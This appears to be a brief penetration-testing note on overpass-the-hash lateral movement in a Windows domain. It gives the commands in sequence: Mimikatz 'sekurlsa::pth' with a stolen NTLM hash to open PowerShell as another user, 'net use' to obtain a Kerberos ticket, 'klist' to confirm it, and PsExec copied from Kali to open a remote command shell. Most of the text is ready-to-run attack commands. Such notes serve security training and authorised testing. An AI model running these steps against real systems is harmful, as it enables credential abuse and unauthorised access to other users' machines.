> With this attack we can abuse an NTLM user hash to gain lateral movement via PsExec. After obtaining an NTLM hash from mimikatz we can run the following in Mimikatz:

```
sekurlsa::pth /user:<username> /domain:<domain_name> /ntlm:<NTLM_hash> /run:powershell
```

> Now we will have a new powershell session open which will allow us to run commands as the other user. Now we can generate a TGT by authenticating to a network share:

```
net use \\<sharename>
```

> We can confirm we have a ticket now by using the command:

```
klist
```

> Now we can use PsExec by transferring it over from kali to obtain a session on the target machine:

```
.\PsExec.exe \\<machine_hostname> cmd
```
